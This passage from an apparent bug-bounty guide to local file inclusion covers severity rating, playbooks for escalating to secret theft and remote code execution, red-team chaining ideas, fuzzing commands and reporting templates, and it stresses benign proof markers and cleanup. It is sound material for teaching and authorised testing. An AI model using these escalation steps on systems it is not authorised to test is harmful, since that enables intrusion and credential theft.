| 5 | **Self-DoS by including huge/`/dev/random`** | Not impact (and harmful). | N/A — don't do it. |
| 6 | **Source map / client file "inclusion"** | Client-side, not server LFI. | A server-side file read/include. |
| 7 | **Blind timing with no demonstrated read** | Unproven. | You produce file contents or RCE. |
| 8 | **`php://filter` of a non-sensitive file** | Low value. | Dump **config/secrets/source** that matters. |
| 9 | **Path traversal limited to one harmless dir** | Limited. | Reaches secrets or an includable/poisonable file. |

> Rule of thumb: if you can't say *"I read `<a real secret/source>` or executed `<a command>` via this parameter,"* you have **traversal confirmation, not LFI impact** — usually Medium at most. Push to secrets or RCE before reporting.

---

# 19. Severity Calibration — how triagers really rate LFI

| Scenario | Typical alone | Realistic chained | What moves it |
|---|---|---|---|
| **LFI → RCE (log/filter-chain/session/wrapper/upload)** | **Critical** | Critical | Command execution / shell. |
| **Source + secret disclosure (config/.env/keys → live creds)** | **High** | Critical | Creds reach DB/cloud → RCE/lateral. |
| **`/proc/self/environ`, k8s SA token, `.aws/credentials`** | **High** | Critical | Cloud/cluster takeover. |
| **Arbitrary file read of sensitive non-cred files (web.config, source)** | **High** | High | Proprietary source / config exposure. |
| **`/etc/passwd`-class read / traversal confirmed** | **Medium** | — | Up by reaching secrets/RCE. |
| **Windows `machineKey` / conn strings disclosed** | **High** | Critical | Forge auth / DB access → RCE. |
| **Blind/limited read** | **Low–Medium** | — | Up if turned into a real read/RCE. |

**CVSS / CWE:**
- LFI→RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (~9.8). **CWE-98** (PHP file inclusion) / **CWE-94** (code exec).
- Secret/source disclosure: `C:H/I:N/A:N` → High. **CWE-22** (path traversal) / **CWE-73** (external control of filename) / **CWE-200/CWE-538**.
- Anchor to **CWE-98** (inclusion→RCE) or **CWE-22** (traversal/read); add CWE-94 when you achieve code exec.

---

# 20. Impact-Escalation Playbooks — "you found X, now do Y"

### 20.1 You found: *`/etc/passwd` reads (traversal confirmed)*
- **Escalate:** read **secrets** — `php://filter` dump `config.php`/`.env` (§10); `/proc/self/environ`, `.aws/credentials`, k8s token. Then try **RCE** (§11–§15).
- **Evidence:** the secret file contents (redacted) and/or an RCE marker.
- **Severity:** Medium → High–Critical.

### 20.2 You found: *a PHP READ sink*
- **Escalate:** `php://filter/convert.base64-encode/resource=` to dump all source + config (§10); then the **filter-chain** RCE (§12).
- **Evidence:** decoded source/secrets; the `id`/marker from the filter-chain.
- **Severity:** High → Critical.

### 20.3 You found: *a PHP INCLUDE sink*
- **Escalate:** RCE by the first available path — log poisoning (§11), session poisoning (§13), `data://`/`php://input` if `allow_url_include` (§14), upload+include (§15), or filter-chain (§12).
- **Evidence:** command output from a benign marker.
- **Severity:** **Critical**.

### 20.4 You found: *a forced `.php` suffix blocking reads*
- **Escalate:** `php://filter` (suffix harmless → still reads source) (§9), or log/session poisoning where the included path is real (§11/§13), or filter-chain RCE (§12).
- **Evidence:** dumped source or RCE marker.
- **Severity:** High–Critical.

### 20.5 You found: *LFI on a Windows/.NET app*
- **Escalate:** read `web.config` → conn strings + **`machineKey`** → forge ViewState/auth → RCE; read IIS logs for log-poisoning (§16).
- **Evidence:** the config/machineKey (redacted) or forged-auth proof.
- **Severity:** High → Critical.

### 20.6 You found: *blind LFI (timing/error only)*
- **Escalate:** find an oracle to confirm reads; pivot to a wrapper that yields output, or to log/session poisoning that produces a visible RCE marker.
- **Evidence:** a confirmed read or RCE marker.
- **Severity:** Low–Medium → up.

---

# 21. Building a Professional, Safe PoC

```
DO:
  □ Prove traversal with a benign file (/etc/hostname or /etc/passwd; win.ini on Windows).
  □ For secrets: read the minimum to prove exposure (the first lines of config/.env; redact creds in the report).
  □ For RCE: run a BENIGN marker only — `echo <unique-token>` or `id` / `whoami`. Capture the output. STOP.
  □ Clean up: delete poisoned log entries you can, remove uploaded files, end poisoned sessions.
  □ Capture: the exact endpoint, the payload (+ bypass), and the file contents / command output.
DON'T:
  □ Read/exfiltrate large amounts of real data, customer files, or full private keys beyond proof.
  □ Run destructive commands, drop a persistent web shell on prod, or pivot beyond proof of RCE.
  □ DoS via /dev/random, huge files, or recursive includes.
  □ Leave artifacts (web shells, poisoned logs, uploaded payloads) behind.
```
> The single most important restraint: **prove RCE with one benign marker command and stop; prove disclosure with minimal redacted content.** You don't need a full data dump or a persistent shell to demonstrate Critical. Same discipline as the SSRF/FileUpload guides.

**Remediation to include:** never pass user input to file APIs; use a **fixed allowlist** (map an id → a known filename server-side); reject any path containing `../`/encoded variants/null bytes after **canonicalization**; pin reads to a base directory and verify the resolved real path stays inside it; disable dangerous PHP wrappers (`allow_url_include=Off`, restrict `php://`, `expect`, `phar`); store logs/sessions outside the web/inclusion path; run with least privilege; keep PHP/stack patched.

---

# 22. Reporting, CWE/CVSS & De-duplication

Use `LFI_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "Local File Inclusion in <param> → RCE via log poisoning"  /  "...→ source & DB-credential disclosure" (name IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-98/22/73 (+ CWE-94 if RCE)
3. Asset        exact endpoint/param + the bypass used + read-vs-include
4. Summary      where the inclusion happens, how you reached the file, what you read/executed
5. Steps        numbered: the payload(s), the bypass, the evidence
6. PoC          file contents (redacted) or the RCE marker output + cleanup note
7. Impact       RCE / secret disclosure / cloud creds — the "so what"
8. Remediation  allowlist + canonicalize + base-dir pin + disable wrappers (§21)
```
**De-dup:** one root cause (an unvalidated path sink) = one finding even if reachable via several params; lead with the highest impact (RCE > secret disclosure > passwd). Don't split "LFI confirmed" and "RCE" — they're one report.

---

# 23. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
ffuf -u "https://target/?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:.*:0:0:"
python3 poc/lfi_fuzz.py -u "https://target/?page=FUZZ" --signatures --wrappers
nuclei -l live.txt -tags lfi,traversal -o lfi.txt
# automated LFI→RCE frameworks (verify manually, clean up):
python3 LFISuite/lfisuite.py     # or liffy / Kadimus
```
- **Quality gate:** never submit "scanner saw root:x:0:0". Reproduce the read by hand, **escalate to secrets or RCE**, prove it with a benign marker, and clean up (§21).

**Red-team angles:**
```
□ LFI → php://filter dump of config/.env → DB/cloud creds → lateral movement + RCE elsewhere.
□ LFI → log/session poisoning → web shell → internal pivot (then SSRF kit from inside).
□ LFI of /proc/self/environ or k8s SA token → container/cloud escape.
□ LFI + FileUpload (upload PHP bytes, include the path) → reliable RCE on hardened uploads.
□ Windows: web.config machineKey → forged ViewState → RCE.
□ Chain: LFI source disclosure reveals other bugs (hardcoded keys → JWT kit, endpoints → IDOR).
```

---

# Appendix A — LFI Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                         LFI WORKFLOW                              │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: every param/feature that picks a file/path/template §3   │
│ 1. BASELINE ★ : read /etc/passwd (win.ini) → traversal? READ or    │
│    INCLUDE? PHP? forced prefix/suffix? §4                          │
│ 2. REACH THE FILE:                                                 │
│    traversal depth-sweep §5 · beat suffix(null/filter) §6 ·        │
│    encodings ....// %252f §7 · allowlist/prefix §8                 │
│ 3. WRAPPERS: php://filter (dump source+secrets) §9/§10 ⭐          │
│ 4. IMPACT ⭐ (climb to RCE):                                        │
│    source+secret disclosure (config/.env/keys) ...... §10 ⭐        │
│    RCE log poisoning ................................ §11 ⭐⭐⭐     │
│    RCE php://filter chain (no write) ................ §12 ⭐⭐⭐     │
│    RCE session / /proc poisoning .................... §13 ⭐⭐       │
│    RCE data:// / expect:// / phar:// ................ §14 ⭐⭐       │
│    RCE upload+include / phpinfo race ................ §15 ⭐⭐       │
│    Windows web.config/machineKey · other stacks ..... §16          │
│ 5. VALIDATE → REPORT:                                              │
│    FP filter §18 (passwd≠Critical) · CVSS+CWE-98/22 §19           │
│    SAFE PoC: benign marker, redact, CLEAN UP §21                  │
│    title = IMPACT (RCE/secret), dedup §22                         │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — LFI → RCE Decision Tree

```
Confirmed I can read a file via the param (§4) →
│
├─ Is the sink INCLUDE (executes) or READ (returns)?
│
├─ READ sink, PHP? → php://filter dump source+config (§10) →
│     ├─ secrets (DB/cloud/keys)? → validate read-only → pivot/RCE elsewhere. HIGH–CRITICAL
│     └─ then filter-chain RCE (§12) → CRITICAL ⭐
│
├─ INCLUDE sink, PHP? → get RCE by the first available path:
│     ├─ readable poisonable log? → log poisoning (§11). CRITICAL ⭐
│     ├─ control a $_SESSION value? → session poisoning (§13). CRITICAL
│     ├─ allow_url_include=On? → data:// / php://input (§14). CRITICAL
│     ├─ can upload any bytes? → upload+include / zip:// (§15). CRITICAL
│     ├─ vulnerable classes + upload? → phar:// deserialization (§14). CRITICAL
│     └─ none of the above? → php://filter CHAIN RCE (§12) — needs only the LFI param. CRITICAL ⭐
│
├─ Forced .php suffix blocking raw reads? → php://filter still reads source (§9); or poison real on-disk paths (§11/§13).
│
├─ Windows/.NET? → web.config (conn strings + machineKey → forge auth → RCE), IIS log poisoning (§16).
│
└─ Non-PHP read-only? → dump source/secrets (.env/settings/web.config/database.yml); template engine? → SSTI kit → RCE.

ALWAYS: escalate past /etc/passwd; prove RCE with a benign marker; CLEAN UP; report the impact (§21).
```

---

# Appendix C — Important Links

```
PortSwigger — File path traversal                    https://portswigger.net/web-security/file-path-traversal
PortSwigger — LFI / wrappers                          https://portswigger.net/web-security/file-inclusion
PayloadsAllTheThings — File Inclusion                 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
php_filter_chain_generator (filter-chain RCE)         https://github.com/synacktiv/php_filter_chain_generator
LFISuite / liffy / Kadimus (LFI→RCE)                  https://github.com/D35m0nd142/LFISuite
SecLists — LFI/Traversal wordlists                    https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
HackTricks — LFI/RFI                                  https://book.hacktricks.xyz/pentesting-web/file-inclusion
CWE-98 (PHP inclusion) / CWE-22 (traversal)           https://cwe.mitre.org/data/definitions/98.html
```

---

> **Final reminder — the one rule that pays:** *An LFI is only a finding when you read a **real secret/source** or execute **your code** — not when you dump `/etc/passwd`.* Confirm traversal, identify read-vs-include, dump source/secrets with `php://filter`, and climb to **RCE** via log poisoning, a filter-chain, session/`/proc` poisoning, wrappers, or upload+include — proving it with a single benign marker and cleaning up. That's how `?page=` becomes the Critical it's worth.
